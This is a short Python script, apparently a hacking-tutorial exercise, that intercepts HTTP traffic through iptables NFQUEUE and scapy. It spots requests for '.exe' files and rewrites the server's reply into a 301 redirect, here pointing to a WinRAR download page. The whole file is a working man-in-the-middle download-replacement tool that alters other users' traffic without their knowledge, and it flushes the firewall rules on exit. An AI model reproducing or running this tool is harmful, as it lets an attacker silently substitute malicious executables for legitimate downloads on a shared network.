import netfilterqueue as net
import scapy.all as scapy
import subprocess


subprocess.call("sudo iptables -I INPUT -j NFQUEUE --queue-num 2",shell=True)
subprocess.call("sudo iptables -I OUTPUT -j NFQUEUE --queue-num 2",shell=True)
acq_list = []

def set_load(scapy_packet,load):
    scapy_packet[scapy.Raw].load = load
    del scapy_packet[scapy.IP].len
    del scapy_packet[scapy.IP].chksum
    del scapy_packet[scapy.TCP].chksum


try:
    def FunyBunny(packet):
        scapy_packet = scapy.IP(packet.get_payload())
        if scapy_packet.haslayer(scapy.Raw):
            if scapy_packet[scapy.TCP]:
                if scapy_packet[scapy.TCP].dport == 80:
                    if ".exe" in scapy_packet[scapy.Raw].load:
                        print(".exe Request")
                        acq_list.append(scapy_packet[scapy.TCP].ack)
                if scapy_packet[scapy.TCP].sport == 80:
                    if scapy_packet[scapy.TCP].seq in acq_list:
                        print("[+]ReplacingFile")
                        modi = set_load(scapy_packet,"HTTP/1.1 301 Moved Permanently\nLocation: https://www.win-rar.com/postdownload.html?&L=0\n\n")
                        packet.set_payload(str(scapy_packet))

                        

        packet.accept()
        
    

    queue  = net.NetfilterQueue()
    queue.bind(2,FunyBunny)
    queue.run()
except KeyboardInterrupt:
    print("[-] Quitting...  Detected Ctrl + C")
    subprocess.call("sudo iptables --flush ",shell=True)

